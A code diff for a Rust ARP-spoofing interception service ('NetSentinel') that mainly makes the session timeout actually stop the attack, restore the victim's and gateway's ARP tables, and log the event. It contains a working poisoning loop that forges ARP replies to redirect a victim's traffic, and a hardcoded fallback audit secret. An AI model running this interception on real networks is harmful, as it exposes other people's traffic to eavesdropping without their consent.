@@ -55,6 +55,7 @@ struct InterceptRuntime {
     previous_ip_forward: Option<String>,
     #[allow(dead_code)]
     arp_loop_handle: JoinHandle<()>,
+    #[allow(dead_code)]
     timeout_handle: JoinHandle<()>,
 }
 
@@ -64,7 +65,7 @@ struct InterceptRuntime {
 
 pub struct InterceptService {
     expected_token: String,
-    audit_logger: AuditLogger,
+    audit_logger: Arc<AuditLogger>,
     runtime: Arc<RwLock<Option<InterceptRuntime>>>,
 }
 
@@ -75,7 +76,7 @@ impl InterceptService {
     /// # Sécurité (RE-01 + RE-02)
     /// - Jeton d'autorisation OBLIGATOIRE (env var NETSENTINEL_AUTH_TOKEN)
     /// - Maximum 1 session simultanée (unicité)
-    /// - Timeout 30 minutes forcé (RE-02)
+    /// - Timeout 30 minutes forcé (RE-02) — cleanup auto + audit log
     /// - Toute action / tentative rejetée logguée HMAC-SHA256
     #[zbus(name = "RequestSession")]
     async fn request_session(
@@ -95,9 +96,14 @@ impl InterceptService {
             return Ok(false);
         }
 
-        let rt = start_intercept(target_ip, operator)
-            .await
-            .map_err(|e| zbus::fdo::Error::Failed(e.to_string()))?;
+        let rt = start_intercept(
+            target_ip,
+            operator,
+            self.runtime.clone(),
+            self.audit_logger.clone(),
+        )
+        .await
+        .map_err(|e| zbus::fdo::Error::Failed(e.to_string()))?;
 
         let victim_ip_str = rt.params.victim_ip.to_string();
         self.audit_logger
@@ -115,7 +121,7 @@ impl InterceptService {
         let rt_opt = self.runtime.write().await.take();
         if let Some(rt) = rt_opt {
             rt.timeout_handle.abort();
-            let _ = rt.arp_loop_handle.abort();
+            rt.arp_loop_handle.abort();
             if let Err(e) = stop_intercept(&rt.params, rt.previous_ip_forward.as_deref()) {
                 error!("Cleanup session erreur: {e}");
             }
@@ -131,7 +137,12 @@ impl InterceptService {
 // Moteur réseau
 // ============================================================================
 
-async fn start_intercept(target_ip_str: &str, operator: &str) -> Result<InterceptRuntime> {
+async fn start_intercept(
+    target_ip_str: &str,
+    operator: &str,
+    runtime_arc: Arc<RwLock<Option<InterceptRuntime>>>,
+    audit_logger_arc: Arc<AuditLogger>,
+) -> Result<InterceptRuntime> {
     info!("Phase 3 — Routage + ARP (opérateur: {operator})");
     let victim_ip: Ipv4Addr = target_ip_str.parse().context("IP victime invalide")?;
 
@@ -194,14 +205,13 @@ async fn start_intercept(target_ip_str: &str, operator: &str) -> Result<Intercep
             Err(e) => { error!("ARP loop open: {e}"); return }
         };
         let start = std::time::Instant::now();
-        // on boucle en mode bloquant (spawn_blocking) car pnet_datalink API est sync
         loop {
             let elapsed = start.elapsed();
             if elapsed > DEFAULT_INTERCEPT_TIMEOUT + Duration::from_secs(60) {
                 warn!("ARP loop arrêt après délai max (+60s marge)");
                 break;
             }
-            let buf1 = build_arp_reply(
+            if let Some(buf1) = build_arp_reply(
                 params_for_loop.own_mac,
                 params_for_loop.victim_mac,
                 params_for_loop.gateway_ip,
@@ -209,8 +219,10 @@ async fn start_intercept(target_ip_str: &str, operator: &str) -> Result<Intercep
                 params_for_loop.gateway_ip,
                 params_for_loop.victim_mac,
                 params_for_loop.victim_ip,
-            );
-            let buf2 = build_arp_reply(
+            ) {
+                let _ = tx.send_to(&buf1, None);
+            }
+            if let Some(buf2) = build_arp_reply(
                 params_for_loop.own_mac,
                 params_for_loop.gateway_mac,
                 params_for_loop.victim_ip,
@@ -218,20 +230,39 @@ async fn start_intercept(target_ip_str: &str, operator: &str) -> Result<Intercep
                 params_for_loop.victim_ip,
                 params_for_loop.gateway_mac,
                 params_for_loop.gateway_ip,
-            );
-            let _ = tx.send_to(&buf1, None);
-            let _ = tx.send_to(&buf2, None);
+            ) {
+                let _ = tx.send_to(&buf2, None);
+            }
             std::thread::sleep(ARP_POISON_INTERVAL);
         }
     });
     let arp_loop_handle: JoinHandle<()> = arp_loop_handle;
 
-    // ===== Étape 4 : Timeout watchdog (soft-abort après 30 min via flag) =====
-    let runtime_clone = self_for_timeout_fallback();
+    // ===== Étape 4 : Timeout watchdog (30 min — trigger cleanup RÉEL via runtime_arc) =====
+    let runtime_for_timeout = runtime_arc.clone();
+    let audit_for_timeout = audit_logger_arc.clone();
+    let victim_ip_for_log = params.victim_ip.to_string();
     let timeout_handle = tokio::spawn(async move {
         tokio::time::sleep(DEFAULT_INTERCEPT_TIMEOUT).await;
-        warn!("SESSION TIMEOUT ATTEINT ({DEFAULT_INTERCEPT_TIMEOUT:?}) — cleanup demandé");
-        let _ = runtime_clone; // le cleanup réel est géré par D-Bus EndSession depuis l'UI ou Ctrl-C
+        warn!("SESSION TIMEOUT ATTEINT ({DEFAULT_INTERCEPT_TIMEOUT:?}) — cleanup automatique déclenché");
+
+        // Acquisition verrou écriture + extraction du runtime
+        let rt_opt = runtime_for_timeout.write().await.take();
+        if let Some(rt) = rt_opt {
+            rt.arp_loop_handle.abort();
+            if let Err(e) = stop_intercept(&rt.params, rt.previous_ip_forward.as_deref()) {
+                error!("Cleanup TIMEOUT erreur: {e}");
+            }
+            let _ = audit_for_timeout.log_action(
+                "SESSION_TIMEOUT",
+                &rt.params.victim_ip.to_string(),
+                "system-timeout",
+            );
+            info!("Session {} terminée par timeout", rt.params.victim_ip);
+        } else {
+            info!("Timeout trigger: runtime déjà absent (session terminée par EndSession)");
+        }
+        let _ = victim_ip_for_log;
     });
 
     Ok(InterceptRuntime {
@@ -242,10 +273,6 @@ async fn start_intercept(target_ip_str: &str, operator: &str) -> Result<Intercep
     })
 }
 
-fn self_for_timeout_fallback() -> Arc<RwLock<Option<InterceptRuntime>>> {
-    Arc::new(RwLock::new(None))
-}
-
 /// Restauration tables ARP (3 envois) + retour à l'IP forwarding d'origine
 fn stop_intercept(params: &SessionParams, previous_ip_forward: Option<&str>) -> Result<()> {
     info!("Cleanup MitM — reARP + restauration IP forwarding");
@@ -254,7 +281,7 @@ fn stop_intercept(params: &SessionParams, previous_ip_forward: Option<&str>) -> 
 
     for _ in 0..3 {
         // Victime : vraie MAC passerelle
-        let r1 = build_arp_reply(
+        if let Some(r1) = build_arp_reply(
             params.gateway_mac,
             params.victim_mac,
             params.gateway_ip,
@@ -262,9 +289,11 @@ fn stop_intercept(params: &SessionParams, previous_ip_forward: Option<&str>) -> 
             params.gateway_ip,
             params.victim_mac,
             params.victim_ip,
-        );
+        ) {
+            let _ = tx.send_to(&r1, None);
+        }
         // Passerelle : vraie MAC victime
-        let r2 = build_arp_reply(
+        if let Some(r2) = build_arp_reply(
             params.victim_mac,
             params.gateway_mac,
             params.victim_ip,
@@ -272,9 +301,11 @@ fn stop_intercept(params: &SessionParams, previous_ip_forward: Option<&str>) -> 
             params.victim_ip,
             params.gateway_mac,
             params.gateway_ip,
-        );
+        ) {
+            let _ = tx.send_to(&r2, None);
+        }
         // Broadcast final pour être certain que tout le monde met à jour sa table
-        let r3 = build_arp_reply(
+        if let Some(r3) = build_arp_reply(
             params.gateway_mac,
             MacAddr::broadcast(),
             params.gateway_ip,
@@ -282,10 +313,9 @@ fn stop_intercept(params: &SessionParams, previous_ip_forward: Option<&str>) -> 
             params.gateway_ip,
             MacAddr::zero(),
             params.victim_ip,
-        );
-        let _ = tx.send_to(&r1, None);
-        let _ = tx.send_to(&r2, None);
-        let _ = tx.send_to(&r3, None);
+        ) {
+            let _ = tx.send_to(&r3, None);
+        }
         std::thread::sleep(Duration::from_millis(400));
     }
 
@@ -366,7 +396,7 @@ fn resolve_mac_arp_blocking(
     let (mut tx, mut rx) = open_datalink(iface)?;
 
     // Envoi ARP Request
-    let req = build_arp_request(own_mac, own_ip, target_ip);
+    let req = build_arp_request(own_mac, own_ip, target_ip).ok_or_else(|| anyhow!("Erreur création paquet ARP Request"))?;
     let _ = tx
         .send_to(&req, None)
         .ok_or_else(|| anyhow!("send_to ARP request indisponible"))?;
@@ -395,15 +425,15 @@ fn resolve_mac_arp_blocking(
     bail!("Pas de réponse ARP pour {target_ip} (hôte injoignable ?)")
 }
 
-fn build_arp_request(src_mac: MacAddr, src_ip: Ipv4Addr, tgt_ip: Ipv4Addr) -> Vec<u8> {
-    let mut eth_buf = [0u8; 42];
-    let mut eth = MutableEthernetPacket::new(&mut eth_buf).unwrap();
+fn build_arp_request(src_mac: MacAddr, src_ip: Ipv4Addr, tgt_ip: Ipv4Addr) -> Option<Vec<u8>> {
+    let mut eth_buf = vec![0u8; 42];
+    let mut eth = MutableEthernetPacket::new(&mut eth_buf)?;
     eth.set_destination(MacAddr::broadcast());
     eth.set_source(src_mac);
     eth.set_ethertype(EtherTypes::Arp);
 
-    let mut arp_buf = [0u8; 28];
-    let mut arp = MutableArpPacket::new(&mut arp_buf).unwrap();
+    let mut arp_buf = vec![0u8; 28];
+    let mut arp = MutableArpPacket::new(&mut arp_buf)?;
     arp.set_hardware_type(ArpHardwareTypes::Ethernet);
     arp.set_protocol_type(EtherTypes::Ipv4);
     arp.set_hw_addr_len(6);
@@ -415,7 +445,7 @@ fn build_arp_request(src_mac: MacAddr, src_ip: Ipv4Addr, tgt_ip: Ipv4Addr) -> Ve
     arp.set_target_proto_addr(tgt_ip);
 
     eth.set_payload(arp.packet_mut());
-    eth.packet().to_vec()
+    Some(eth.packet().to_vec())
 }
 
 /// Construit une trame ARP Reply forgée : `claim_ip` est associée à `claim_mac`.
@@ -427,15 +457,15 @@ fn build_arp_reply(
     sender_ip: Ipv4Addr,
     target_hw: MacAddr,
     target_ip: Ipv4Addr,
-) -> Vec<u8> {
-    let mut eth_buf = [0u8; 42];
-    let mut eth = MutableEthernetPacket::new(&mut eth_buf).unwrap();
+) -> Option<Vec<u8>> {
+    let mut eth_buf = vec![0u8; 42];
+    let mut eth = MutableEthernetPacket::new(&mut eth_buf)?;
     eth.set_destination(dst_mac);
     eth.set_source(src_mac);
     eth.set_ethertype(EtherTypes::Arp);
 
-    let mut arp_buf = [0u8; 28];
-    let mut arp = MutableArpPacket::new(&mut arp_buf).unwrap();
+    let mut arp_buf = vec![0u8; 28];
+    let mut arp = MutableArpPacket::new(&mut arp_buf)?;
     arp.set_hardware_type(ArpHardwareTypes::Ethernet);
     arp.set_protocol_type(EtherTypes::Ipv4);
     arp.set_hw_addr_len(6);
@@ -447,7 +477,7 @@ fn build_arp_reply(
     arp.set_target_proto_addr(target_ip);
 
     eth.set_payload(arp.packet_mut());
-    eth.packet().to_vec()
+    Some(eth.packet().to_vec())
 }
 
 // ============================================================================
@@ -472,12 +502,15 @@ async fn main() -> Result<()> {
     let audit_secret = std::env::var("NETSENTINEL_AUDIT_SECRET")
         .unwrap_or_else(|_| "netsentinel-dev-audit-secret-change-me".to_string());
 
-    let audit_logger = AuditLogger::new(&audit_secret, "/var/log/netsentinel_audit.jsonl");
+    let audit_logger = Arc::new(AuditLogger::new(
+        &audit_secret,
+        "/var/log/netsentinel_audit.jsonl",
+    ));
 
     let runtime = Arc::new(RwLock::new(None));
     let svc = InterceptService {
         expected_token,
-        audit_logger,
+        audit_logger: audit_logger.clone(),
         runtime: runtime.clone(),
     };
 
@@ -497,7 +530,7 @@ async fn main() -> Result<()> {
         info!("Ctrl-C / SIGINT — cleanup MitM immédiat");
         if let Some(rt) = rt_clone.write().await.take() {
             rt.timeout_handle.abort();
-            let _ = rt.arp_loop_handle.abort();
+            rt.arp_loop_handle.abort();
             let _ = stop_intercept(&rt.params, rt.previous_ip_forward.as_deref());
         }
         std::process::exit(0);
